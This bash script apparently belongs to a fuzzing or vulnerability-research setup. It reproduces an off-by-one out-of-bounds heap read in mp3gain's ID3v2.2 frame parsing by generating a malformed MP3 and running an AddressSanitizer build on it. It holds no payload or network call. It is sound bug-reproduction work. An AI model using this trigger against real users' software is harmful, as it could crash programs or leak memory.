#!/bin/bash
# PoC runner for VULN 001: Off-by-one OOB heap read in ID3v2.2 frame size parsing
# id3tag.c:583-592  CWE-125
#
# Requires mp3gain -s i flag to enable ID3 tag reading (sets useId3=1).
# On Linux the argument parser only recognises 2-char flags, so -si is two
# separate tokens: -s (flag) followed by i (sub-option).

set -uo pipefail

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/mp3gain/id3tag_c"
MP3GAIN="/data/ylwang/non-textfuzz/target/mp3gain/build_test/mp3gain"
MP3FILE="${POC_DIR}/vuln_001.mp3"
RESULT="${POC_DIR}/vuln_001_result.txt"
ASAN_LOG="${POC_DIR}/asan.log"

cd "${POC_DIR}"

# Step 1: Generate the malicious MP3 if not already present
if [ ! -f "${MP3FILE}" ]; then
    python3 vuln_001_gen.py
fi

# Step 2: Clean previous results
rm -f "${RESULT}" "${ASAN_LOG}."*

# Step 3: Run mp3gain under ASAN
# -s i  : enable ID3v2 tag reading (useId3=1); needed to reach id3_parse_v2_tag
ASAN_OPTIONS="abort_on_error=0:log_path=${ASAN_LOG}" \
    "${MP3GAIN}" -s i "${MP3FILE}" > "${RESULT}" 2>&1 || true

# Step 4: Collect ASAN output into result file
for f in "${ASAN_LOG}."*; do
    if [ -f "${f}" ]; then
        echo "--- ASAN log: ${f} ---" >> "${RESULT}"
        cat "${f}" >> "${RESULT}"
    fi
done

echo "--- Run complete ---" >> "${RESULT}"
cat "${RESULT}"
